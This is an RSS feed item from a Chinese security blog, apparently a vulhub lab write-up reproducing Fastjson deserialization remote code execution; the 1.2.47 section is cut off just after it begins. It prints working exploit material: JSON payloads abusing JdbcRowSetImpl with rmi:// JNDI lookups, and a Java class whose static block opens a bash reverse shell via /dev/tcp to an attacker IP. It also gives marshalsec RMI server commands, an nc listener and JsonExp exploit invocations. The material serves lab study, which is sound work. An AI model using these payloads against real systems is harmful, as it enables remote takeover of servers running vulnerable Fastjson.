<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>sqrt7 • Posts by &#34;靶场&#34; tag</title>
        <link>https://w-sqrt7.gitee.io</link>
        <description></description>
        <language>zh-CN</language>
        <pubDate>Thu, 25 Apr 2024 19:30:55 +0800</pubDate>
        <lastBuildDate>Thu, 25 Apr 2024 19:30:55 +0800</lastBuildDate>
        <category>原创</category>
        <category>逆向</category>
        <category>C语言</category>
        <category>misc</category>
        <category>汇编</category>
        <category>web</category>
        <category>网基</category>
        <category>eNSP</category>
        <category>转载</category>
        <category>信息安全</category>
        <category>渗透</category>
        <category>哲学</category>
        <category>工具</category>
        <category>基础</category>
        <category>kali</category>
        <category>靶场</category>
        <category>vulhub</category>
        <item>
            <guid isPermalink="true">https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</guid>
            <title>【vulhub】Fastjson漏洞复现</title>
            <link>https://w-sqrt7.gitee.io/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</link>
            <category>原创</category>
            <category>靶场</category>
            <category>vulhub</category>
            <pubDate>Thu, 25 Apr 2024 19:30:55 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;【vulhub】Fastjson漏洞复现&#34;&gt;&lt;a href=&#34;#【vulhub】Fastjson漏洞复现&#34; class=&#34;headerlink&#34; title=&#34;【vulhub】Fastjson漏洞复现&#34;&gt;&lt;/a&gt;【vulhub】Fastjson漏洞复现&lt;/h1&gt;&lt;h1 id=&#34;1-2-24-rce&#34;&gt;&lt;a href=&#34;#1-2-24-rce&#34; class=&#34;headerlink&#34; title=&#34;1.2.24-rce&#34;&gt;&lt;/a&gt;1.2.24-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：&#34;&gt;&lt;a href=&#34;#漏洞原理：&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并调用该类的set&amp;#x2F;get方法来访问属性。通过查找代码中相关的方法，即可构造出一些恶意利用链。&lt;/p&gt;
&lt;p&gt;使用AutoType功能进行序列号的JSON字符会带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法，然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。&lt;/p&gt;
&lt;p&gt;常见的有sun官方提供的一个类com.sun.rowset.JdbcRowSetImpl，其中有个dataSourceName方法支持传入一个rmi的源，只要解析其中的url就会支持远程调用！&lt;/p&gt;
&lt;p&gt;因为目标环境是Java 8u102，没com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。&lt;/p&gt;
&lt;p&gt;影响范围：fastjson&amp;lt;&amp;#x3D;1.2.24&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：&#34;&gt;&lt;a href=&#34;#漏洞复现：&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;实验前提：python3版本，java1.8版本&lt;/p&gt;
&lt;p&gt;java环境配置可参考文章：&lt;a href=&#34;https://blog.csdn.net/huayimy/article/details/130273362&#34;&gt;https://blog.csdn.net/huayimy/article/details/130273362&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;漏洞验证，利用dnslog等平台进行验证，BP抓包，修改为POST方法，修改Content-Type，放入payload，然后发送数据包&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&amp;quot;zeo&amp;quot;:&amp;#123;&amp;quot;@type&amp;quot;:&amp;quot;java.net.Inet4Address&amp;quot;,&amp;quot;val&amp;quot;:&amp;quot;dgs0uq.dnslog.cn&amp;quot;&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425203104478.png&#34; alt=&#34;image-20240425203104478&#34;&gt;&lt;/p&gt;
&lt;p&gt;漏洞利用，首先编译payload，利用&lt;code&gt;javac TouchFile.java&lt;/code&gt;命令，编译TouchFile.java文件，生成TouchFile.class文件，实际情况中需要将编译好的payload放在公网服务器上的，这里只是进行本地的验证尝试，理解即可。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// javac TouchFile.java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Runtime;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Process;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class TouchFile &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    static &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Runtime rt = Runtime.getRuntime();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String[] commands = &amp;#123;&amp;quot;touch&amp;quot;, &amp;quot;/tmp/successFrank&amp;quot;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Process pc = rt.exec(commands);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pc.waitFor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            // do nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;这里就将kali作为放置payload的服务器，进入放置payload的目录，进行如下命令，启动服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 5555&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174031274.png&#34; alt=&#34;image-20240425174031274&#34;&gt;&lt;/p&gt;
&lt;p&gt;接下来使用marshalsec项目，启动RMI服务，监听9999端口，并制定加载远程类TouchFile.class&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &amp;quot;http://192.168.100.131:5555/#TouchFile&amp;quot; 9999&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;a href=&#34;https://github.com/mbechler/marshalsec&#34;&gt;marshalsec项目下载地址&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;项目拉取下来后，在pom.xml所在目录，需要运行以下命令生成.jar文件（生成成功后位于此目录的target子目录下）&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;mvn clean package -DskipTests&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425174713907.png&#34; alt=&#34;image-20240425174713907&#34;&gt;&lt;/p&gt;
&lt;p&gt;然后访问靶机，BP抓包，进行修改，将GET方法改为POST方法发送，修改Content-Type，加入payload，发送，观察响应报文发现已经成功创建。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 168&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;b&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi://192.168.100.131:9999/TouchFile&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;autoCommit&amp;quot;:true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-25%20174829.png&#34; alt=&#34;屏幕截图 2024-04-25 174829&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425175440976.png&#34; alt=&#34;image-20240425175440976&#34;&gt;&lt;/p&gt;
&lt;p&gt;也可以直接进入docker容器中进行查看&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;docker exex –it 你的CONTAINER_ID bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;上面的过程理解之后&lt;/strong&gt;，然后开始尝试getshell，还是先编译payload，注意修改里面的ip和端口，还有一点需要注意，该Java文件的文件名需要和其内容中的public后的公共类相同，具体参考java的命名规范，否则是会出现编译错误的。&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;// javac GetShell.java&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Runtime;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import java.lang.Process;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;public class GetShell &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    static &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        try &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Runtime rt = Runtime.getRuntime();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            String[] commands = &amp;#123;&amp;quot;/bin/bash&amp;quot;,&amp;quot;-c&amp;quot;,&amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.100.131/7777 0&amp;gt;&amp;amp;1&amp;quot;&amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            Process pc = rt.exec(commands);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            pc.waitFor();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; catch (Exception e) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            // do nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;nc开启监听，等待shell反弹&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 7777&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182200299.png&#34; alt=&#34;image-20240425182200299&#34;&gt;&lt;/p&gt;
&lt;p&gt;python开启http服务&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python -m http.server 5555&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182338663.png&#34; alt=&#34;image-20240425182338663&#34;&gt;&lt;/p&gt;
&lt;p&gt;开启RMI服务，并监听9999端口，注意修改对应内容&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &amp;quot;http://192.168.100.131:5555/#GetShell&amp;quot; 9999 &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425182500809.png&#34; alt=&#34;image-20240425182500809&#34;&gt;&lt;/p&gt;
&lt;p&gt;BP抓包，改为POST请求方法，修改Content-Type，加入payload(注意修改内容)并发送&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Content-Type: application/json&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content-Length: 173&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;quot;b&amp;quot;:&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;@type&amp;quot;:&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;dataSourceName&amp;quot;:&amp;quot;rmi://192.168.100.131:9999/GetShell&amp;quot;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;quot;autoCommit&amp;quot;:true&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;然后就发现已经成功进行getshell操作了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183720913.png&#34; alt=&#34;image-20240425183720913&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183748769.png&#34; alt=&#34;image-20240425183748769&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425183934178.png&#34; alt=&#34;image-20240425183934178&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;或利用工具进行漏洞验证&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JsonExp -u http://192.168.100.134:8090/ -l tvcy5n.dnslog.cn&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195446761.png&#34; alt=&#34;image-20240425195446761&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/TouchFile&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;JsonExp -u http://192.168.100.134:8090/ -r 192.168.100.131:9999/GetShell&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/04/25/vulhub/%E3%80%90vulhub%E3%80%91Fastjson%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/image-20240425195613834.png&#34; alt=&#34;image-20240425195613834&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-2-47-rce&#34;&gt;&lt;a href=&#34;#1-2-47-rce&#34; class=&#34;headerlink&#34; title=&#34;1.2.47-rce&#34;&gt;&lt;/a&gt;1.2.47-rce&lt;/h1&gt;&lt;h2 id=&#34;漏洞原理：-1&#34;&gt;&lt;a href=&#34;#漏洞原理：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞原理：&#34;&gt;&lt;/a&gt;漏洞原理：&lt;/h2&gt;&lt;p&gt;Fastjson是阿里巴巴公司开源的一款json解析器，其性能优越，被广泛应用于各大厂商的Java项目中。fastjson于1.2.24版本后增加了反序列化白名单，而在1.2.48以前的版本中，攻击者可以利用特殊构造的json字符串绕过白名单检测，成功执行任意命令。&lt;/p&gt;
&lt;h2 id=&#34;漏洞复现：-1&#34;&gt;&lt;a href=&#34;#漏洞复现：-1&#34; class=&#34;headerlink&#34; title=&#34;漏洞复现：&#34;&gt;&lt;/a&gt;漏洞复现：&lt;/h2&gt;&lt;p&gt;基本流程手法和上面一个漏洞基本相同，只是最后的BP发送的payload稍稍有点区别&lt;/p&gt;
&lt;p&gt;和上一个一样，先开启各项服务&lt;/p&gt;
